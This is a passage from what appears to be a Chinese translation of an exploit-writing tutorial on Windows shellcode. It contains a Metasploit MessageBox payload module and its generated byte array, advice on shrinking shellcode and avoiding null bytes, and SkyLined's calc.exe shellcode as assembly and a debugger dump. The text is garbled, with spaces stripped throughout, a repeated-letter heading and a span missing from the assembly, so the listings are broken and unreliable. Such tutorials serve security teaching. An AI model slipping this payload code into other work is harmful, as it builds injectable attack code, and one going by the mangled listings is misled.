payload_data+=offsetBack
payload_data+="\xff\xff\xff"
payload_data+=datastore['TEXT']+"\x00"
returnpayload_data
else
raiseArgumentError,"Titleshouldbe255charactersorless"
end
end
end
endTryit:
xxxx@bt4:/pentest/exploits/framework3#./msfpayloadwindows/messageboxS
Name:WindowsMessageboxwithcustomtitleandtext
Version:1
Platform:Windows
Arch:x86
NeedsAdmin:No
Totalsize:0
Rank:Normal
Providedby:
corelanc0d3r-peter.ve
rick2600-ricks2600
Basicoptions:
Name CurrentSetting Required Description
---- --------------- -------- -----------
TEXT yes MessageboxText
TITLE yes MessageboxTitle(max255chars)
Description:
SpawnsMessageBoxwithacustomizabletitle&text./msfpayloadwindows/messagebox
TITLE="Thisismycustomtitle"
TEXT="AndyouhavebeenOwned"C
/*
*windows/messagebox-319bytes
*http://www.metasploit.com
*TEXT=AndyouhavebeenOwned,TITLE=Thisismycustomtitle
*/
unsignedcharbuf[]=
"\x56\x31\xc0\x31\xdb\xb3\x30\x64\x8b\x03\x8b\x40\x0c\x8b\x40"
"\x14\x50\x5e\x8b\x06\x50\x5e\x8b\x06\x8b\x40\x10\x5e\xe9\x92"
"\x00\x00\x00\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78"
"\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x37\x49\x8b\x34"
"\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x0a\xc1\xcf"
"\x0d\x01\xc7\xe9\xf1\xff\xff\xff\x3b\x7c\x24\x28\x75\xde\x8b"
"\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04"
"\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xad\x50\x52\xe8\xa7\xff"
"\xff\xff\x89\x07\x81\xc4\x08\x00\x00\x00\x81\xc7\x04\x00\x00"
"\x00\x39\xce\x75\xe6\xc3\xe8\x46\x00\x00\x00\x75\x73\x65\x72"
"\x33\x32\x2e\x64\x6c\x6c\x00\xe8\x20\x00\x00\x00\x8e\x4e\x0e"
"\xec\x7e\xd8\xe2\x73\xe8\x33\x00\x00\x00\xa8\xa2\x4d\xbc\x81"
"\xec\x08\x00\x00\x00\x89\xe5\x89\xc2\xe9\xdb\xff\xff\xff\x5e"
"\x8d\x7d\x04\x89\xf1\x81\xc1\x08\x00\x00\x00\xe8\x9f\xff\xff"
"\xff\xe9\xb5\xff\xff\xff\xff\x55\x04\x89\xc2\xe9\xc8\xff\xff"
"\xff\x5e\xad\x50\x52\xe8\x36\xff\xff\xff\xe9\x15\x00\x00\x00"
"\x5b\xe9\x2c\x00\x00\x00\x59\x31\xd2\x52\x53\x51\x52\xff\xd0"
"\x31\xc0\x50\xff\x55\x08\xe8\xe6\xff\xff\xff\x54\x68\x69\x73"
"\x20\x69\x73\x20\x6d\x79\x20\x63\x75\x73\x74\x6f\x6d\x20\x74"
"\x69\x74\x6c\x65\x00\xe8\xcf\xff\xff\xff\x41\x6e\x64\x20\x79"
"\x6f\x75\x20\x68\x61\x76\x65\x20\x62\x65\x65\x6e\x20\x4f\x77"
"\x6e\x65\x64\x00";
写小的 sssshhhheeeellllllllccccooooddddeeee
我们用一个69字节的只能在XPSP3下工作的MessageBoxshellcode来开始这个教程，并且
程序里的kernel32和user32都已经加载了，然后用一个350字节的可移植的MessageBox
shellcode（不是最佳化的，因为依然保护一些null字节）来结束，并且可以在各种windows
OS版本上工作。避免这些null字节将会使它更大。
很明显使shellcode可移植的影响是很大的，因此你需要找到平衡并集中注意力在目标上：
你要一次性的shellcode或者通用的代码？它真的需要可移植还是你想证明这个点？这些是
影响你的shellcode的大小重要问题。
在大多数情况下，为了以小一点的shellcode来结束，你将要创造性地在你的代码里用寄存
器，循环，避免null字节的方法（而不是用payload编码器），并且不要再像一个程序员那
样思考，而是时刻想着目标...你需要在一个寄存器或堆栈里得到什么？达到目的的最好方法
是什么？
这真的是一门艺术。
在头脑里记住这些：
在避免代码中的null字节或者用payload编码器之间做出选择。这取决于你要干什么，
这两者中的一个会产生最短的代码。（如果你面临着字符集限制，你最好尽量将shellcode写
短点，包括null字节，然后用编码器来摆脱null字节和坏字节。避免在代码里用跳转因为
这些指令会产生更多的null字节。可以用便宜量来实现跳转。
你的代码美不美不重要。如果它能工作或者是可移植的，那么这就是你所要的。
如果你要为一个特定的程序写shellcode，你可以查下已经加载的模块。当你知道那个程
序已经加载了这个模块，你就不用做一些LoadLibrary的操作。这将会使shellcode不通用，
但它不会降低这个特定的exploit的效率。
NGSSoftware写了一篇关于写smallshellcode的白皮书awhitepaper，概括了一些通用的写
更短一点的代码的方法。
简单概括下：
用小的指令（会产生短字节码的指令）
用有多种用途的指令（用那些一次可以做很多事的指令，来避免用更多的指令）
利用API的规则（如果null是必须的一个参数，那么你可以事将栈中的一部分填充为0，
然后只要将没有null参数的入栈（他们将会被栈上已经存在的null阻断）
不要像一个程序员那样思考。你不需要初始化任何东西--你只要用栈上或寄存器上的
值）
充分利用寄存器。但是你不能用所有的寄存器来存信息，有一些寄存器有特殊用途。
此外，有些寄存器是跟寄存器无关的（在一个API执行之后值不变），因此你可以在
API完用这些寄存器的值。
让我们用没有null字节的calcshellcode（文章前面的）（185字节）和calcshellcodewrittenby
skylined（只有100字节并且没有null字节）（从这里获得asm代码here）相比较..用这个例
子来说明一些产生短小代码的技术并且不失代码的可移植性。
他的代码是这样的：
;Copyright(c)2009-2010,Berend-Jan"SkyLined"Wever
;Projecthomepage:http://code.google.com/p/w32-dl-loadlib-shellcode/
;Allrightsreserved.SeeCOPYRIGHT.txtfordetails.
BITS32
;WorksinanyapplicationforWindows5.0-7.0allservicepacks.
;(Seehttp://skypher.com/wiki/index.php/Hacking/Shellcode).
;Thisversionuses16-bithashes.
%defineurl'http://skypher.com/dll'
%strlensizeof_urlurl
%include'w32-exec-calc-shellcode-hash-list.asm'
%defineB2W(b1,b2) (((b2)Ldr
MOV ESI,[ESI+0x1C] ;ESI=PEB->Ldr.InInitOrder
;(firstmodule)
next_module:;Getthebaseaddressofthecurrentmoduleand
;findthenextmodule:
MOV EBP,[ESI+0x08] ;EBP=InInitOrder[X].base_address
MOV ESI,[ESI] ;ESI=InInitOrder[X].flink==
; InInitOrder[X+1]
get_proc_address_loop:;FindthePEheaderand
;exportandnamestablesofthemodule:
MOV EBX,[EBP+0x3C] ;EBX=&(PEheader)
MOV EBX,[EBP+EBX+0x78] ;EBX=offset(exporttable)
ADD EBX,EBP ;EBX=&(exporttable)
MOV ECX,[EBX+0x18] ;ECX=numberofnamepointers
JCXZ next_module ;Nonamepointers?Nextmodule.
next_function_loop:;Getthenextfunctionnameforhashing:
MOV EDI,[EBX+0x20] ;EDI=offset(namestable)
ADD EDI,EBP ;EDI=&(namestable)
MOV EDI,[EDI+ECX*4-4] ;EDI=offset(functionname)
ADD EDI,EBP ;EDI=&(functionname)
XOR EAX,EAX ;EAX=0
CDQ ;EDX=0
hash_loop:;Hashthefunctionnameandcomparewithrequestedhash
XOR DL,[EDI]
ROR DX,BYTEhash_ror_value
SCASB
JNE hash_loop
CMP DX,hash_kernel32_WinExec
LOOPNE next_function_loop ;Nottherighthashandfunctionsleft
;inmodule?Nextfunction
JNE next_module ;Nottherighthashandnofunctions
;leftinmodule?Nextmodule
;Foundtherighthash:gettheaddressofthefunction:
MOV EDX,[EBX+0x24] ;ESI=offsetordinalstable
ADD EDX,EBP ;ESI=&oridinalstable
MOVZX EDX,WORD[EDX+2*ECX] ;ESI=ordinalnumberoffunction
MOV EDI,[EBX+0x1C] ;EDI=offsetaddresstable
ADD EDI,EBP ;EDI=&addresstable
ADD EBP,[EDI+4*EDX] ;EBP=&(function)
;createthecalc.exestring
PUSH B2DW('.','e','x','e') ;Stack=".exe",0
PUSH B2DW('c','a','l','c') ;Stack="calc.exe",0
PUSH ESP ;Stack=&("calc.exe"),"calc.exe",0
XCHG EAX,[ESP] ;Stack=0,"calc.exe",0
PUSH EAX ;Stack=&("calc.exe"),0,"calc.exe",0
CALL EBP ;WinExec(&("calc.exe"),0);
INT3 ;Crash
或者，在调试器中：
00402000 31F6 XORESI,ESI
00402002 56 PUSHESI
00402003 64:8B7630 MOVESI,DWORDPTRFS:[ESI+30]
00402007 8B760C MOVESI,DWORDPTRDS:[ESI+C]
0040200A 8B761C MOVESI,DWORDPTRDS:[ESI+1C]
0040200D 8B6E08 MOVEBP,DWORDPTRDS:[ESI+8]
00402010 8B36 MOVESI,DWORDPTRDS:[ESI]
00402012 8B5D3C MOVEBX,DWORDPTRSS:[EBP+3C]
00402015 8B5C1D78 MOVEBX,DWORDPTRSS:[EBP+EBX+78]
00402019 01EB ADDEBX,EBP
0040201B 8B4B18 MOVECX,DWORDPTRDS:[EBX+18]
0040201E 67:E3EC JCXZSHORTtestshel.0040200D
00402021 8B7B20 MOVEDI,DWORDPTRDS:[EBX+20]
00402024 01EF ADDEDI,EBP
00402026 8B7C8FFC MOVEDI,DWORDPTRDS:[EDI+ECX*4-4]
0040202A 01EF ADDEDI,EBP
0040202C 31C0 XOREAX,EAX
0040202E 99 CDQ
0040202F 3217 XORDL,BYTEPTRDS:[EDI]
00402031 66:C1CA01 RORDX,1
00402035 AE SCASBYTEPTRES:[EDI]
00402036 ^75F7 JNZSHORTtestshel.0040202F
00402038 66:81FA10F5 CMPDX,0F510
0040203D ^E0E2 LOOPDNESHORTtestshel.00402021
0040203F ^75CC JNZSHORTtestshel.0040200D
00402041 8B5324 MOVEDX,DWORDPTRDS:[EBX+24]
00402044 01EA ADDEDX,EBP
00402046 0FB7144A MOVZXEDX,WORDPTRDS:[EDX+ECX*2]
0040204A 8B7B1C MOVEDI,DWORDPTRDS:[EBX+1C]
0040204D 01EF ADDEDI,EBP
0040204F 032C97 ADDEBP,DWORDPTRDS:[EDI+EDX*4]